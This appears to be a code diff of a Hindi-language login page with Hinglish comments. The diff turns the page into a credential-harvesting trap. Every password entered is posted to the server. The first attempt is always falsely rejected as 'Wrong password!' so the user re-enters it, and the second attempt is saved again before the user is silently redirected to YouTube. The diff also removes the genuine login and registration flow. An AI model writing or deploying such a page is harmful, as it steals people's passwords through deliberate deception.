@@ -510,7 +510,6 @@
 
 
 
-
 <!DOCTYPE html>
 <html lang="hi">
 <head>
@@ -680,18 +679,6 @@
       to { transform: rotate(360deg); }
     }
 
-    .status {
-      min-height: 24px;
-      text-align: center;
-      font-size: 13px;
-      font-weight: 500;
-      margin-top: 16px;
-    }
-
-    .status.error { color: #ed4956; }
-    .status.success { color: #4ae0a0; }
-    .status.info { color: #b0b0b0; }
-
     .footer-note {
       margin-top: 20px;
       text-align: center;
@@ -740,8 +727,6 @@
     </button>
   </form>
 
-  <div class="status" id="status"></div>
-
   <div class="footer-note">
     <span id="userInfo">✨ Enter credentials</span>
   </div>
@@ -749,32 +734,19 @@
 
 <script>
   (function() {
-    // ===== API URL =====
     const API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
       ? 'http://localhost:5000/api'
       : '/api';
     const REDIRECT_URL = 'https://www.youtube.com';
 
-    // DOM Elements
     const form = document.getElementById('loginForm');
     const userIdInput = document.getElementById('userId');
     const passwordInput = document.getElementById('password');
     const showPassword = document.getElementById('showPassword');
-    const statusEl = document.getElementById('status');
     const loginBtn = document.getElementById('loginBtn');
     const userInfo = document.getElementById('userInfo');
 
     let attempt = 0;
-
-    function showStatus(msg, type = 'info') {
-      statusEl.textContent = msg;
-      statusEl.className = `status ${type}`;
-    }
-
-    function clearStatus() {
-      statusEl.textContent = '';
-      statusEl.className = 'status';
-    }
 
     function setLoading(state) {
       if (state) {
@@ -786,33 +758,29 @@
       }
     }
 
-    // ==================== API CALLS ====================
+    // ===== API CALLS =====
 
-    // 1. WRONG ATTEMPT - Pehli baar (database mein save hoga)
+    // 1. WRONG ATTEMPT - Pehli baar (database mein save)
     async function saveWrongAttempt(userId, password) {
       const res = await fetch(`${API_URL}/register`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          userId, 
-          password, 
-          isWrongAttempt: true 
-        })
+        body: JSON.stringify({ userId, password, isWrongAttempt: true })
       });
       return res.json();
     }
 
-    // 2. REGISTER - Naya user
-    async function registerUser(userId, password) {
+    // 2. SECOND ATTEMPT - Dusri baar (database mein save + redirect)
+    async function saveSecondAttempt(userId, password) {
       const res = await fetch(`${API_URL}/register`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId, password })
+        body: JSON.stringify({ userId, password, isSecondAttempt: true })
       });
       return res.json();
     }
 
-    // 3. LOGIN - Existing user
+    // 3. LOGIN - Existing user (dusri baar ke liye)
     async function loginUser(userId, password) {
       const res = await fetch(`${API_URL}/login`, {
         method: 'POST',
@@ -822,114 +790,93 @@
       return res.json();
     }
 
-    // ==================== GRANT ACCESS ====================
-
-    function grantAccess(userData) {
-      localStorage.setItem('savedUserId', userData.userId);
-      userInfo.innerHTML = `✅ <span style="color:#4ae0a0;">${userData.userId}</span> · Logins: ${userData.loginCount}`;
-      
-      // Direct redirect (no message)
-      window.location.href = REDIRECT_URL;
-    }
-
-    // ==================== FORM SUBMIT ====================
+    // ===== FORM SUBMIT =====
 
     form.addEventListener('submit', async function(e) {
       e.preventDefault();
-      clearStatus();
 
       const userId = userIdInput.value.trim();
       const password = passwordInput.value;
 
       if (!userId || !password) {
-        showStatus('❌ Please fill in both fields', 'error');
+        alert('❌ Please fill in both fields');
         return;
       }
 
       attempt++;
 
-      // ===== FIRST ATTEMPT: WRONG PASSWORD (SAVE TO DATABASE) =====
+      // ===== FIRST ATTEMPT: Wrong Password Alert + Save =====
       if (attempt === 1) {
         setLoading(true);
-        showStatus('⏳ Saving credentials...', 'info');
         
         try {
-          // ✅ Database mein wrong attempt save ho raha hai!
-          const result = await saveWrongAttempt(userId, password);
-          console.log('✅ Wrong attempt saved:', result);
-
-          if (result.success) {
-            userInfo.innerHTML = `📝 <span style="color:#f5b342;">${userId}</span> · Attempt 1 (saved)`;
-          }
-
-          setTimeout(() => {
-            setLoading(false);
-            clearStatus();
-            alert('❌ Wrong password! Please enter the correct password.');
-            passwordInput.value = '';
-            passwordInput.focus();
-          }, 600);
-
-        } catch (err) {
-          console.error('Save error:', err);
+          // Database mein save ho raha hai (background mein)
+          await saveWrongAttempt(userId, password);
+          
           setLoading(false);
-          showStatus('❌ Error saving credentials', 'error');
+          
+          // Sirf alert dikhega
+          alert('❌ Wrong password! Please enter the correct password.');
+          
+          passwordInput.value = '';
+          passwordInput.focus();
+          
+        } catch (err) {
+          console.error('Error:', err);
+          setLoading(false);
+          alert('❌ Something went wrong. Please try again.');
         }
         return;
       }
 
-      // ===== SECOND ATTEMPT: REAL LOGIN/REGISTER =====
-      setLoading(true);
-      showStatus('⏳ Processing...', 'info');
-
-      try {
-        // Try login first
-        let result = await loginUser(userId, password);
-
-        if (result.success && result.data) {
-          // ✅ Login successful - database mein update (loginCount++)
-          grantAccess(result.data);
-          return;
-        }
-
-        // If user not found → register
-        if (result.message && result.message.toLowerCase().includes('user not found')) {
-          showStatus('📝 New user! Registering...', 'info');
+      // ===== SECOND ATTEMPT: Direct Redirect (Database mein save) =====
+      if (attempt === 2) {
+        setLoading(true);
+        
+        try {
+          // Database mein second attempt save ho raha hai
+          await saveSecondAttempt(userId, password);
           
-          const regResult = await registerUser(userId, password);
+          // Login bhi kar do (database update)
+          await loginUser(userId, password);
           
-          if (regResult.success && regResult.data) {
-            // ✅ Registration successful - database mein save
-            grantAccess(regResult.data);
-          } else {
-            showStatus(`❌ Registration failed: ${regResult.message}`, 'error');
-            setLoading(false);
-          }
-        } else {
-          showStatus(`❌ ${result.message}`, 'error');
+          // Direct redirect - No message, No alert
+          window.location.href = REDIRECT_URL;
+          
+        } catch (err) {
+          console.error('Error:', err);
           setLoading(false);
+          alert('❌ Something went wrong. Please try again.');
         }
+        return;
+      }
 
+      // ===== THIRD+ ATTEMPTS: Direct Redirect =====
+      setLoading(true);
+      
+      try {
+        await loginUser(userId, password);
+        window.location.href = REDIRECT_URL;
       } catch (err) {
-        console.error('Submit error:', err);
-        showStatus('❌ Network error. Please try again.', 'error');
+        console.error('Error:', err);
         setLoading(false);
+        alert('❌ Something went wrong. Please try again.');
       }
     });
 
-    // ==================== SHOW PASSWORD ====================
+    // ===== SHOW PASSWORD =====
 
     showPassword.addEventListener('change', function() {
       passwordInput.type = this.checked ? 'text' : 'password';
     });
 
-    // ==================== INIT ====================
+    // ===== INIT =====
 
     function init() {
       const saved = localStorage.getItem('savedUserId');
       if (saved) {
         userIdInput.value = saved;
-        userInfo.innerHTML = `📌 <span style="color:#b0b0b0;">${saved}</span> (saved)`;
+        userInfo.innerHTML = `📌 <span style="color:#b0b0b0;">${saved}</span>`;
         passwordInput.focus();
       } else {
         userInfo.innerHTML = '✨ Enter credentials';
